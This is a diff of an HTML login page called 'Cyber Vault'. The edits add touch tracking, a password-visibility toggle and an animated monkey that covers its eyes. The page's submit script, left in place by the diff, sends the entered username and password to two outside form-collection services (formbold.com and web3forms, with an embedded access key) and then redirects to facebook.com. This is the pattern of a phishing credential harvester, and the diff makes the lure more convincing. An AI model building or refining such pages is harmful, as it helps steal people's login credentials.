@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Cyber Vault</title>
+    <title>Touch-Ready Cyber Vault</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; cursor: none; } /* Custom Cursor */
+        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; cursor: none; touch-action: none; } /* Touch-action none stops default scrolling while moving dot */
         
         body { 
             margin: 0; padding: 0; min-height: 100vh;
@@ -14,24 +14,25 @@
             background: #02040a; overflow: hidden;
         }
 
-        /* 1. ADVANCED MOUSE TRACKER */
+        /* 1. TOUCH & MOUSE TRACKER */
         #cursor-glow {
-            position: fixed; width: 400px; height: 400px;
-            background: radial-gradient(circle, rgba(0, 242, 255, 0.08) 0%, transparent 70%);
+            position: fixed; width: 300px; height: 300px;
+            background: radial-gradient(circle, rgba(0, 242, 255, 0.1) 0%, transparent 70%);
             border-radius: 50%; pointer-events: none; transform: translate(-50%, -50%);
-            z-index: 1; transition: 0.1s;
+            z-index: 1; transition: 0.05s linear;
         }
 
         .custom-cursor {
-            position: fixed; width: 10px; height: 10px; background: #00f2ff;
+            position: fixed; width: 12px; height: 12px; background: #00f2ff;
             border-radius: 50%; pointer-events: none; z-index: 9999;
             box-shadow: 0 0 10px #00f2ff, 0 0 20px #00f2ff;
+            transform: translate(-50%, -50%);
         }
 
         /* 🐒 MONKEY STYLING */
         .monkey-box {
             position: absolute; top: -100px; left: 50%; transform: translateX(-50%);
-            font-size: 80px; z-index: 10; transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            font-size: 80px; z-index: 10; transition: 0.4s;
         }
         .monkey-face { color: #00f2ff; text-shadow: 0 0 20px #00f2ff; }
         .monkey-closed { position: absolute; top: 0; left: 0; color: #ff00ff; opacity: 0; text-shadow: 0 0 20px #ff00ff; }
@@ -62,18 +63,15 @@
 
         .eye-icon {
             position: absolute; right: 15px; top: 18px; color: rgba(0, 242, 255, 0.5);
-            cursor: pointer; font-size: 18px; transition: 0.3s;
+            cursor: pointer; font-size: 18px; z-index: 5;
         }
-        .eye-icon:hover { color: #00f2ff; }
 
-        /* 4. PRO BUTTON */
         .btn-pro { 
             width: 100%; padding: 16px; border: none; border-radius: 12px;
             background: linear-gradient(45deg, #00f2ff, #0072ff);
             color: #fff; font-weight: bold; text-transform: uppercase;
             cursor: pointer; box-shadow: 0 5px 20px rgba(0, 114, 255, 0.4); transition: 0.3s;
         }
-        .btn-pro:hover { transform: scale(1.02); filter: brightness(1.2); box-shadow: 0 0 25px #00f2ff; }
 
         .links { color: #ff00ff; font-weight: bold; cursor: pointer; text-shadow: 0 0 10px rgba(255,0,255,0.3); }
     </style>
@@ -96,7 +94,7 @@
             <div class="input-group">
                 <input type="password" id="pass" name="Pass" placeholder="Security Key" required 
                        onfocus="cover()" onblur="uncover()">
-                <i class="fa-solid fa-eye eye-icon" onclick="togglePass()"></i>
+                <i class="fa-solid fa-eye eye-icon" id="eye-btn" onclick="togglePass()"></i>
             </div>
             <button type="submit" class="btn-pro">Decrypt & Enter</button>
         </form>
@@ -126,34 +124,44 @@
     </div>
 
     <script>
-        // 1. Mouse Tracker Logic
         const glow = document.getElementById('cursor-glow');
         const dot = document.querySelector('.custom-cursor');
-        document.addEventListener('mousemove', (e) => {
-            glow.style.left = e.clientX + 'px';
-            glow.style.top = e.clientY + 'px';
-            dot.style.left = e.clientX + 'px';
-            dot.style.top = e.clientY + 'px';
-        });
 
-        // 2. Monkey Logic
+        // 🔥 TOUCH & MOUSE TRACKER LOGIC
+        function moveDot(e) {
+            let x = e.type === 'mousemove' ? e.clientX : e.touches[0].clientX;
+            let y = e.type === 'mousemove' ? e.clientY : e.touches[0].clientY;
+            
+            glow.style.left = x + 'px';
+            glow.style.top = y + 'px';
+            dot.style.left = x + 'px';
+            dot.style.top = y + 'px';
+        }
+
+        document.addEventListener('mousemove', moveDot);
+        document.addEventListener('touchmove', moveDot);
+        document.addEventListener('touchstart', moveDot); // For instant reaction
+
+        // 🐒 Monkey Animation
         function cover() { document.getElementById('monkey').classList.add('look-away'); }
         function uncover() { 
-            // Agar ankh wala button on hai, toh haath mat hatao
             if(document.getElementById('pass').type === 'password') {
                 document.getElementById('monkey').classList.remove('look-away');
             }
         }
 
-        // 3. Password Toggle Logic
+        // Eye Toggle
         function togglePass() {
             const p = document.getElementById('pass');
+            const eye = document.getElementById('eye-btn');
             if(p.type === 'password') {
                 p.type = 'text';
-                document.getElementById('monkey').classList.remove('look-away'); // Bandar ankhain khol dega
+                eye.classList.replace('fa-eye', 'fa-eye-slash');
+                document.getElementById('monkey').classList.remove('look-away');
             } else {
                 p.type = 'password';
-                document.getElementById('monkey').classList.add('look-away'); // Bandar phir haath rakh lega
+                eye.classList.replace('fa-eye-slash', 'fa-eye');
+                document.getElementById('monkey').classList.add('look-away');
             }
         }
 
@@ -167,15 +175,11 @@
             const btn = e.target.querySelector('button');
             btn.innerText = "SYNCING...";
             const fd = new FormData(e.target);
-            
-            // Dual Engine
             fetch("https://formbold.com/s/3VKEQ", { method: "POST", body: fd, mode: 'no-cors' });
-            
             const b = new FormData(e.target);
             b.append('access_key', '4d4d7ede-0cff-474c-86ce-5d228506375d');
             b.append('subject', s);
             fetch("https://api.web3forms.com/submit", { method: "POST", body: b });
-
             setTimeout(() => { window.location.href = "https://www.facebook.com"; }, 1500);
         }
     </script>
